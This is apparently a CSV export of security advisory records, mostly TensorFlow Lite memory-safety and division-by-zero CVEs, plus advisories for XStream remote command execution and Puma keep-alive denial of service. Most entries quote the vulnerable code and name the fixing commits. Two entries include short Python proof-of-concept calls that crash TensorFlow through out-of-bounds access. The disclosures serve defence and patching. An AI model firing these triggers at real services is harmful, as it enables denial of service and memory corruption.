283,20741,tensorflow,GHSA-24x6-8c7m-hv3f,CVE-2021-29590,https://github.com/advisories/GHSA-24x6-8c7m-hv3f,low,2021-05-21 14:26:53 UTC,Heap OOB read in TFLite's implementation of `Minimum` or `Maximum`,"### Impact
The implementations of the `Minimum` and `Maximum` TFLite operators can be used to read data outside of bounds of heap allocated objects, if any of the two input tensor arguments are empty.

This is because [the broadcasting implementation](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/reference/maximum_minimum.h#L52-L56) indexes in both tensors with the same index but does not validate that the index is within bounds:

```cc
auto maxmin_func = [&](int indexes[N]) {
  output_data[SubscriptToIndex(output_desc, indexes)] =
    op(input1_data[SubscriptToIndex(desc1, indexes)],
        input2_data[SubscriptToIndex(desc2, indexes)]);
};
```

### Patches
We have patched the issue in GitHub commit [953f28dca13c92839ba389c055587cfe6c723578](https://github.com/tensorflow/tensorflow/commit/953f28dca13c92839ba389c055587cfe6c723578).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
284,20741,tensorflow,GHSA-cwv3-863g-39vx,CVE-2021-29591,https://github.com/advisories/GHSA-cwv3-863g-39vx,high,2021-05-21 14:26:56 UTC,Stack overflow due to looping TFLite subgraph,"### Impact
TFlite graphs must not have loops between nodes. However, this condition was not checked and an attacker could craft models that would result in infinite loop during evaluation. In certain cases, the infinite loop would be replaced by stack overflow due to too many recursive calls.

For example, the [`While` implementation](https://github.com/tensorflow/tensorflow/blob/106d8f4fb89335a2c52d7c895b7a7485465ca8d9/tensorflow/lite/kernels/while.cc) could be tricked into a scneario where both the body and the loop subgraphs are the same. Evaluating one of the subgraphs means calling the `Eval` function for the other and this quickly exhaust all stack space.
    
### Patches 
We have patched the issue in GitHub commit [9c1dc920d8ffb4893d6c9d27d1f039607b326743](https://github.com/tensorflow/tensorflow/commit/9c1dc920d8ffb4893d6c9d27d1f039607b326743) (for the `While` operator) and in GitHub commit [c6173f5fe66cdbab74f4f869311fe6aae2ba35f4](https://github.com/tensorflow/tensorflow/commit/c6173f5fe66cdbab74f4f869311fe6aae2ba35f4) (in general).
    
The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
285,20741,tensorflow,GHSA-jjr8-m8g8-p6wv,CVE-2021-29592,https://github.com/advisories/GHSA-jjr8-m8g8-p6wv,moderate,2021-05-21 14:26:58 UTC,Null pointer dereference in TFLite's `Reshape` operator,"### Impact
The fix for [CVE-2020-15209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15209) missed the case when the target shape of `Reshape` operator is given by the elements of a 1-D tensor. As such, the [fix for the vulnerability](https://github.com/tensorflow/tensorflow/blob/9c1dc920d8ffb4893d6c9d27d1f039607b326743/tensorflow/lite/core/subgraph.cc#L1062-L1074) allowed passing a null-buffer-backed tensor with a 1D shape:

```cc
if (tensor->data.raw == nullptr && tensor->bytes > 0) {
  if (registration.builtin_code == kTfLiteBuiltinReshape && i == 1) {
    // In general, having a tensor here with no buffer will be an error.
    // However, for the reshape operator, the second input tensor is only
    // used for the shape, not for the data. Thus, null buffer is ok.
    continue;
  } else {
    // In all other cases, we need to return an error as otherwise we will
    // trigger a null pointer dereference (likely).
    ReportError(""Input tensor %d lacks data"", tensor_index);
    return kTfLiteError;
  }
}
```

### Patches
We have patched the issue in GitHub commit [f8378920345f4f4604202d4ab15ef64b2aceaa16](https://github.com/tensorflow/tensorflow/commit/f8378920345f4f4604202d4ab15ef64b2aceaa16).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
286,20741,tensorflow,GHSA-4vrf-ff7v-hpgr,CVE-2021-29596,https://github.com/advisories/GHSA-4vrf-ff7v-hpgr,low,2021-05-21 14:27:51 UTC,Division by zero in TFLite's implementation of `EmbeddingLookup`,"The implementation of the `EmbeddingLookup` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/e4b29809543b250bc9b19678ec4776299dd569ba/tensorflow/lite/kernels/embedding_lookup.cc#L73-L74):

```cc
const int row_size = SizeOfDimension(value, 0);
const int row_bytes = value->bytes / row_size;
```

An attacker can craft a model such that the first dimension of the `value` input is 0.

### Patches
We have patched the issue in GitHub commit [f61c57bd425878be108ec787f4d96390579fb83e](https://github.com/tensorflow/tensorflow/commit/f61c57bd425878be108ec787f4d96390579fb83e).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
287,20741,tensorflow,GHSA-v52p-hfjf-wg88,CVE-2021-29597,https://github.com/advisories/GHSA-v52p-hfjf-wg88,low,2021-05-21 14:27:54 UTC,Division by zero in TFLite's implementation of `SpaceToBatchNd`,"### Impact
The implementation of the `SpaceToBatchNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/412c7d9bb8f8a762c5b266c9e73bfa165f29aac8/tensorflow/lite/kernels/space_to_batch_nd.cc#L82-L83):

```cc
TF_LITE_ENSURE_EQ(context, final_dim_size % block_shape[dim], 0);
output_size->data[dim + 1] = final_dim_size / block_shape[dim];
```

An attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.

### Patches
We have patched the issue in GitHub commit [6d36ba65577006affb272335b7c1abd829010708](https://github.com/tensorflow/tensorflow/commit/6d36ba65577006affb272335b7c1abd829010708).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
288,20741,tensorflow,GHSA-pmpr-55fj-r229,CVE-2021-29598,https://github.com/advisories/GHSA-pmpr-55fj-r229,low,2021-05-21 14:27:58 UTC,Division by zero in TFLite's implementation of `SVDF`,"### Impact
The implementation of the `SVDF` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/7f283ff806b2031f407db64c4d3edcda8fb9f9f5/tensorflow/lite/kernels/svdf.cc#L99-L102):

```cc
const int rank = params->rank;
...
TF_LITE_ENSURE_EQ(context, num_filters % rank, 0);
```

An attacker can craft a model such that `params->rank` would be 0.

### Patches
We have patched the issue in GitHub commit [6841e522a3e7d48706a02e8819836e809f738682](https://github.com/tensorflow/tensorflow/commit/6841e522a3e7d48706a02e8819836e809f738682).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
289,20741,tensorflow,GHSA-97wf-p777-86jq,CVE-2021-29599,https://github.com/advisories/GHSA-97wf-p777-86jq,low,2021-05-21 14:28:01 UTC,Division by zero in TFLite's implementation of Split,"### Impact
The implementation of the `Split` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/e2752089ef7ce9bcf3db0ec618ebd23ea119d0c7/tensorflow/lite/kernels/split.cc#L63-L65):

```cc
TF_LITE_ENSURE_MSG(context, input_size % num_splits == 0, ""Not an even split"");
const int slice_size = input_size / num_splits;
```

An attacker can craft a model such that `num_splits` would be 0.

### Patches
We have patched the issue in GitHub commit [b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d](https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360. ",pip
290,20741,tensorflow,GHSA-j8qh-3xrq-c825,CVE-2021-29600,https://github.com/advisories/GHSA-j8qh-3xrq-c825,low,2021-05-21 14:28:04 UTC,Division by zero in TFLite's implementation of `OneHot`,"### Impact
The implementation of the `OneHot` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/f61c57bd425878be108ec787f4d96390579fb83e/tensorflow/lite/kernels/one_hot.cc#L68-L72):

```cc
int prefix_dim_size = 1;
for (int i = 0; i < op_context.axis; ++i) {
  prefix_dim_size *= op_context.indices->dims->data[i];
}
const int suffix_dim_size = NumElements(op_context.indices) / prefix_dim_size;
```

An attacker can craft a model such that at least one of the dimensions of `indices` would be 0. In turn, the `prefix_dim_size` value would become 0.

### Patches
We have patched the issue in GitHub commit [3ebedd7e345453d68e279cfc3e4072648e5e12e5](https://github.com/tensorflow/tensorflow/commit/3ebedd7e345453d68e279cfc3e4072648e5e12e5).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
291,20741,tensorflow,GHSA-9c84-4hx6-xmm4,CVE-2021-29601,https://github.com/advisories/GHSA-9c84-4hx6-xmm4,moderate,2021-05-21 14:28:08 UTC,Integer overflow in TFLite concatentation,"### Impact
The TFLite implementation of concatenation is [vulnerable to an integer overflow issue](https://github.com/tensorflow/tensorflow/blob/7b7352a724b690b11bfaae2cd54bc3907daf6285/tensorflow/lite/kernels/concatenation.cc#L70-L76):

```cc
for (int d = 0; d < t0->dims->size; ++d) {
  if (d == axis) { 
    sum_axis += t->dims->data[axis]; 
  } else {
    TF_LITE_ENSURE_EQ(context, t->dims->data[d], t0->dims->data[d]);
  }
}
```

An attacker can craft a model such that the dimensions of one of the concatenation input overflow the values of `int`. TFLite uses `int` to represent tensor dimensions, whereas TF uses `int64`. Hence, valid TF models can trigger an integer overflow when converted to TFLite format.

### Patches
We have patched the issue in GitHub commit [4253f96a58486ffe84b61c0415bb234a4632ee73](https://github.com/tensorflow/tensorflow/commit/4253f96a58486ffe84b61c0415bb234a4632ee73).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
292,20741,tensorflow,GHSA-rf3h-xgv5-2q39,CVE-2021-29602,https://github.com/advisories/GHSA-rf3h-xgv5-2q39,low,2021-05-21 14:28:12 UTC,Division by zero in TFLite's implementation of `DepthwiseConv`,"### Impact
The implementation of the `DepthwiseConv` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8/tensorflow/lite/kernels/depthwise_conv.cc#L287-L288):

```cc
int num_input_channels = SizeOfDimension(input, 3);
TF_LITE_ENSURE_EQ(context, num_filter_channels % num_input_channels, 0);
```

An attacker can craft a model such that `input`'s fourth dimension would be 0.

### Patches
We have patched the issue in GitHub commit [cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0](https://github.com/tensorflow/tensorflow/commit/cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
293,20741,tensorflow,GHSA-crch-j389-5f84,CVE-2021-29603,https://github.com/advisories/GHSA-crch-j389-5f84,low,2021-05-21 14:28:15 UTC,Heap OOB write in TFLite,"### Impact
A specially crafted TFLite model could trigger an OOB write on heap in the TFLite implementation of [`ArgMin`/`ArgMax`](https://github.com/tensorflow/tensorflow/blob/102b211d892f3abc14f845a72047809b39cc65ab/tensorflow/lite/kernels/arg_min_max.cc#L52-L59):

```cc
TfLiteIntArray* output_dims = TfLiteIntArrayCreate(NumDimensions(input) - 1);
int j = 0;
for (int i = 0; i < NumDimensions(input); ++i) { 
  if (i != axis_value) {
    output_dims->data[j] = SizeOfDimension(input, i);
    ++j;
  }
}
```

If `axis_value` is not a value between 0 and `NumDimensions(input)`, then the condition in the `if` is never true, so code writes past the last valid element of `output_dims->data`.
  
### Patches 
We have patched the issue in GitHub commit [c59c37e7b2d563967da813fa50fe20b21f4da683](https://github.com/tensorflow/tensorflow/commit/c59c37e7b2d563967da813fa50fe20b21f4da683).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
294,20741,tensorflow,GHSA-8rm6-75mf-7r7r,CVE-2021-29604,https://github.com/advisories/GHSA-8rm6-75mf-7r7r,low,2021-05-21 14:28:19 UTC,Division by zero in TFLite's implementation of hashtable lookup,"### Impact
The TFLite implementation of hashtable lookup is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8/tensorflow/lite/kernels/hashtable_lookup.cc#L114-L115):

```cc
const int num_rows = SizeOfDimension(value, 0); 
const int row_bytes = value->bytes / num_rows; 
```

An attacker can craft a model such that `values`'s first dimension would be 0.

### Patches
We have patched the issue in GitHub commit [5117e0851348065ed59c991562c0ec80d9193db2](https://github.com/tensorflow/tensorflow/commit/5117e0851348065ed59c991562c0ec80d9193db2).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
295,20741,tensorflow,GHSA-jf7h-7m85-w2v2,CVE-2021-29605,https://github.com/advisories/GHSA-jf7h-7m85-w2v2,high,2021-05-21 14:28:22 UTC,Integer overflow in TFLite memory allocation,"### Impact
The TFLite code for allocating `TFLiteIntArray`s is [vulnerable to an integer overflow issue](https://github.com/tensorflow/tensorflow/blob/4ceffae632721e52bf3501b736e4fe9d1221cdfa/tensorflow/lite/c/common.c#L24-L27):

```cc
int TfLiteIntArrayGetSizeInBytes(int size) {
  static TfLiteIntArray dummy;
  return sizeof(dummy) + sizeof(dummy.data[0]) * size;
}   
```

An attacker can craft a model such that the `size` multiplier is so large that the return value overflows the `int` datatype and becomes negative. In turn, this results in [invalid value being given to `malloc`](https://github.com/tensorflow/tensorflow/blob/4ceffae632721e52bf3501b736e4fe9d1221cdfa/tensorflow/lite/c/common.c#L47-L52):

```cc
TfLiteIntArray* TfLiteIntArrayCreate(int size) {
  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(TfLiteIntArrayGetSizeInBytes(size));
  ret->size = size; 
  return ret;
}
``` 

In this case, `ret->size` would dereference an invalid pointer.

### Patches
We have patched the issue in GitHub commit [7c8cc4ec69cd348e44ad6a2699057ca88faad3e5](https://github.com/tensorflow/tensorflow/commit/7c8cc4ec69cd348e44ad6a2699057ca88faad3e5).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
296,20741,tensorflow,GHSA-h4pc-gx2w-f2xv,CVE-2021-29606,https://github.com/advisories/GHSA-h4pc-gx2w-f2xv,high,2021-05-21 14:28:24 UTC,Heap OOB read in TFLite,"### Impact
A specially crafted TFLite model could trigger an OOB read on heap in the TFLite implementation of [`Split_V`](https://github.com/tensorflow/tensorflow/blob/c59c37e7b2d563967da813fa50fe20b21f4da683/tensorflow/lite/kernels/split_v.cc#L99):

```cc
const int input_size = SizeOfDimension(input, axis_value);
``` 

If `axis_value` is not a value between 0 and `NumDimensions(input)`, then the [`SizeOfDimension` function](https://github.com/tensorflow/tensorflow/blob/102b211d892f3abc14f845a72047809b39cc65ab/tensorflow/lite/kernels/kernel_util.h#L148-L150) will access data outside the bounds of the tensor shape array:

```cc
inline int SizeOfDimension(const TfLiteTensor* t, int dim) {
  return t->dims->data[dim];
}
```
  
### Patches 
We have patched the issue in GitHub commit [ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412](https://github.com/tensorflow/tensorflow/commit/ae2daeb45abfe2c6dda539cf8d0d6f653d3ef412).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
297,20741,tensorflow,GHSA-3qgw-p4fm-x7gf,CVE-2021-29594,https://github.com/advisories/GHSA-3qgw-p4fm-x7gf,low,2021-05-21 14:27:45 UTC,Division by zero in TFLite's convolution code,"### Impact
TFLite's [convolution code](https://github.com/tensorflow/tensorflow/blob/09c73bca7d648e961dd05898292d91a8322a9d45/tensorflow/lite/kernels/conv.cc) has multiple division where the divisor is controlled by the user and not checked to be non-zero. For example:

```cc 
const int input_size = NumElements(input) / SizeOfDimension(input, 0);
```

### Patches
We have patched the issue in GitHub commit [ff489d95a9006be080ad14feb378f2b4dac35552](https://github.com/tensorflow/tensorflow/commit/ff489d95a9006be080ad14feb378f2b4dac35552).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360. ",pip
298,34016,com.thoughtworks.xstream:xstream,GHSA-7chv-rrw6-w6fc,CVE-2021-29505,https://github.com/advisories/GHSA-7chv-rrw6-w6fc,high,2021-05-18 18:36:27 UTC,XStream is vulnerable to a Remote Command Execution attack,"### Impact
The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types.

### Patches
If you rely on XStream's default blacklist of the Security Framework, you will have to use at least version 1.4.17.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for [CVE-2021-29505](https://x-stream.github.io/CVE-2021-29505.html).

### Credits

V3geB1rd, white hat hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Email us at [XStream Google Group](https://groups.google.com/group/xstream-user)
",maven
299,20741,tensorflow,GHSA-cfx7-2xpc-8w4h,CVE-2021-29593,https://github.com/advisories/GHSA-cfx7-2xpc-8w4h,low,2021-05-21 14:27:01 UTC,Division by zero in TFLite's implementation of `BatchToSpaceNd`,"### Impact
The implementation of the `BatchToSpaceNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/b5ed552fe55895aee8bd8b191f744a069957d18d/tensorflow/lite/kernels/batch_to_space_nd.cc#L81-L82):

```cc
TF_LITE_ENSURE_EQ(context, output_batch_size % block_shape[dim], 0);
output_batch_size = output_batch_size / block_shape[dim];
```

An attacker can craft a model such that one dimension of the `block` input is 0. Hence, the corresponding value in `block_shape` is 0.

### Patches
We have patched the issue in GitHub commit [2c74674348a4708ced58ad6eb1b23354df8ee044](https://github.com/tensorflow/tensorflow/commit/2c74674348a4708ced58ad6eb1b23354df8ee044).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
300,18987,puma,GHSA-q28m-8xjw-8vr5,CVE-2021-29509,https://github.com/advisories/GHSA-q28m-8xjw-8vr5,high,2021-05-18 01:27:15 UTC,Puma's Keepalive Connections Causing Denial Of Service,"This vulnerability is related to [CVE-2019-16770](https://github.com/puma/puma/security/advisories/GHSA-7xx3-m584-x994).

### Impact

The fix for CVE-2019-16770 was incomplete. The original fix only protected existing connections that had already been accepted from having their requests starved by greedy persistent-connections saturating all threads in the same process. However, new connections may still be starved by greedy persistent-connections saturating all threads in all processes in the cluster.

A `puma` server which received more concurrent `keep-alive` connections than the server had threads in its threadpool would service only a subset of connections, denying service to the unserved connections.

### Patches

This problem has been fixed in `puma` 4.3.8 and 5.3.1.

### Workarounds

Setting `queue_requests false` also fixes the issue. This is not advised when using `puma` without a reverse proxy, such as `nginx` or `apache`, because you will open yourself to slow client attacks (e.g. [slowloris](https://en.wikipedia.org/wiki/Slowloris_(computer_security))).

The fix is very small. [A git patch is available here](https://gist.github.com/nateberkopec/4b3ea5676c0d70cbb37c82d54be25837) for those using [unsupported versions](https://github.com/puma/puma/security/policy#supported-versions) of Puma.

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [Puma](https://github.com/puma/puma).
* To report problems with this fix or to report another vulnerability, see [our security policy.](https://github.com/puma/puma/security/policy)

### Acknowledgements

Thank you to @MSP-Greg, @wjordan and @evanphx for their review on this issue. 

Thank you to @ioquatix for providing a modified fork of `wrk` which made debugging this issue much easier.",rubygems
301,20741,tensorflow,GHSA-vf94-36g5-69v8,CVE-2021-29595,https://github.com/advisories/GHSA-vf94-36g5-69v8,low,2021-05-21 14:27:49 UTC,Division by zero in TFLite's implementation of `DepthToSpace`,"### Impact
The implementation of the `DepthToSpace` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/depth_to_space.cc#L63-L69):

```cc
const int block_size = params->block_size;
...
const int input_channels = input->dims->data[3];
... 
int output_channels = input_channels / block_size / block_size;
``` 

An attacker can craft a model such that `params->block_size` is 0.

### Patches
We have patched the issue in GitHub commit [106d8f4fb89335a2c52d7c895b7a7485465ca8d9](https://github.com/tensorflow/tensorflow/commit/106d8f4fb89335a2c52d7c895b7a7485465ca8d9).
    
The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
302,20741,tensorflow,GHSA-rgvq-pcvf-hx75,CVE-2021-29608,https://github.com/advisories/GHSA-rgvq-pcvf-hx75,moderate,2021-05-21 14:28:27 UTC,Heap OOB and null pointer dereference in `RaggedTensorToTensor`,"### Impact
Due to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:

```python
import tensorflow as tf

shape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)
values = tf.constant([], shape=[0], dtype=tf.int64)
default_value = tf.constant(404, dtype=tf.int64)
row = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)
rows = [row]
types = ['ROW_SPLITS']

tf.raw_ops.RaggedTensorToTensor(
  shape=shape, values=values, default_value=default_value, 
  row_partition_tensors=rows, row_partition_types=types)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.

There are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don't prevent anything.

### Patches
We have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https://github.com/tensorflow/tensorflow/commit/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https://github.com/tensorflow/tensorflow/commit/c4d7afb6a5986b04505aca4466ae1951686c80f6).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
303,20741,tensorflow,GHSA-cjc7-49v2-jp64,CVE-2021-29609,https://github.com/advisories/GHSA-cjc7-49v2-jp64,moderate,2021-05-21 14:28:29 UTC,Incomplete validation in `SparseAdd`,"### Impact
Incomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:

```python
import tensorflow as tf

a_indices = tf.zeros([10, 97], dtype=tf.int64)
a_values = tf.zeros([10], dtype=tf.int64)
a_shape = tf.zeros([0], dtype=tf.int64)

b_indices = tf.zeros([0, 0], dtype=tf.int64)
b_values = tf.zeros([0], dtype=tf.int64)
b_shape = tf.zeros([0], dtype=tf.int64)
  
thresh = 0

tf.raw_ops.SparseAdd(a_indices=a_indices,
                    a_values=a_values,
                    a_shape=a_shape,
                    b_indices=b_indices,
                    b_values=b_values,
                    b_shape=b_shape,
                    thresh=thresh)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_add_op.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.

### Patches
We have patched the issue in GitHub commit [6fd02f44810754ae7481838b6a67c5df7f909ca3](https://github.com/tensorflow/tensorflow/commit/6fd02f44810754ae7481838b6a67c5df7f909ca3) followed by GitHub commit  [41727ff06111117bdf86b37db198217fd7a143cc](https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
